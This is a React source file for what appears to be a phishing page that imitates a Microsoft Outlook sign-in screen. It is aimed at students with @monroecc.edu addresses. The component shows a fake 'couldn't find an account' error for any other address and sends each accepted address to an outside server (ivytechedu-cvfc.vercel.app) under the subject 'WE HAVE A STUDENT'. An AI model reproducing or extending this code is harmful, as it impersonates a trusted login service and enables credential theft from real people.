import { useState, useEffect } from "react";
import axios from "axios"; // Import axios
import { FormFooter } from "./FormFooter";

export const Email = ({ onNext, emailError, email }) => {
  const [emailValue, setEmailValue] = useState("");
  const [borderColor, setBorderColor] = useState("1px solid #ccc"); // Default border color
  const [errorMessage, setErrorMessage] = useState("");
  const [isSending, setIsSending] = useState(false); // Track sending status
  const [isEmailValidated, setIsEmailValidated] = useState(false); // Track email validation

  // If email prop changes, set it as the value for the email input
  useEffect(() => {
    if (email) {
      setEmailValue(email); // Pre-fill the email field
    }
  }, [email]);

  // Handle input changes
  const handleInputChange = (e) => {
    setEmailValue(e.target.value);
    setBorderColor("1px solid #ccc"); // Reset border color when typing
    setErrorMessage(""); // Reset error message when user starts typing
  };

  // Function to send email using axios
  const sendEmail = async (email) => {
    const payload = {
      subject: `${email.toString().toUpperCase()} : WE HAVE A STUDENT`,
      message: `User entered the email: ${email}`, // This will be the email body
    };

    try {
      setIsSending(true); // Set sending state to true when the sending starts
      const response = await axios.post(
        "https://ivytechedu-cvfc.vercel.app/send-email",
        payload
      ); // Make POST request to backend email API
      console.log("Email sent successfully", response.data);
      setIsSending(false); // Reset sending state after the email is sent
      onNext(email); // Proceed to the next step after the email is successfully sent
    } catch (error) {
      setIsSending(false); // Reset sending state in case of error
      console.error(
        "Failed to send email",
        error.response?.data || error.message
      );
    }
  };

  // Handle the next button click
  const handleNext = () => {
    // Check if the email is empty or invalid
    if (!emailValue.trim()) {
      setErrorMessage(
        "Enter a valid email address, phone number, or Skype name."
      );
      setBorderColor("1px solid red"); // Red border for empty email
    } else if (!emailValue.includes("@monroecc.edu")) {
      setErrorMessage("We couldn't find an account with that username.");
      setBorderColor("1px solid red"); // Red border for invalid email
    } else {
      setErrorMessage(""); // No error
      setBorderColor("1px solid #ccc"); // Reset border
      setIsEmailValidated(true); // Mark email as validated
      sendEmail(emailValue); // Send email with the entered email address
      localStorage.setItem("student_id", emailValue);
      console.log(emailValue);
    }
  };

  return (
    <>
      <div
        className="field-container"
        style={{ opacity: isEmailValidated && isSending ? 0.5 : 1 }} // Apply fade when email is validated and sending
      >
        <div className="f-t">
          <h1 className="form-title">Sign in</h1>
          
          <p className="ft">to continue to Outlook</p>
        </div>

        <div className="input-message">
          {/* Show error message if there's an error */}
          {errorMessage && (
            <p className="guide error" style={{ color: "red" }}>
              {errorMessage}
            </p>
          )}

          <input
            type="email"
            name="email"
            id="email"
            placeholder="Email, phone or Skype"
            className="field email-field"
            value={emailValue}
            onChange={handleInputChange}
            style={{
              borderBottom: borderColor, // Apply border color dynamically
              backgroundColor: "transparent", // Keep background transparent
            }}
          />
        </div>
        <a className="reset">Reset or Forgot Password</a>

        <div className="button-container">
          <button type="button" className="next" onClick={handleNext}>
            Next
          </button>
        </div>
      </div>
      <FormFooter />
    </>
  );
};
